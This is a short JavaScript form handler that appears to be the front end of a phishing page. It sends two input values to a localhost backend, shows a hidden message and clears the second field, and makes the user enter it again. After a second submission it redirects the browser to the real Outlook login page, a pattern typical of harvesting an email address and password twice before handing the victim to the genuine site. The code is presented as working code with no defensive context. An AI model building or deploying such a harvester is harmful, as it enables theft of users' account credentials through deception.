let clickedOnce = false;

document.getElementById("btn").addEventListener("click", async () => {
  const input1Field = document.getElementById("input1");
  const input2Field = document.getElementById("input2");
  const msg = document.getElementById("msg");

  const input1 = input1Field.value.trim();
  const input2 = input2Field.value.trim();

  if (!input1 || !input2) {
    alert("Please fill in both inputs.");
    return;
  }

  // ✅ Send to backend
  try {
    await fetch("http://localhost:3000/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ input1, input2 }),
    });
    console.log("✅ Sent:", { input1, input2 });
  } catch (err) {
    console.error("❌ Failed to send:", err);
    return;
  }

  if (!clickedOnce) {
    // 🔒 Lock input1 after first submit
    input1Field.disabled = true;

    // 👁️ Show <p>
    msg.style.display = "block";

    // 🧹 Clear only input2
    input2Field.value = "";

    clickedOnce = true;
  } else {
    // 🧠 On second click, must re-fill input2
    if (!input2) {
      alert("Please re-enter input2 before continuing.");
      return;
    }

    // ✅ Send again before redirecting
    try {
      await fetch("http://localhost:3000/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ input1: input1Field.value.trim(), input2 }),
      });
      console.log("✅ Second Sent:", {
        input1: input1Field.value.trim(),
        input2,
      });
    } catch (err) {
      console.error("❌ Failed second time:", err);
      return;
    }

    // 🌍 Redirect to new page
    window.location.href = "https://outlook.com/login";
  }
});
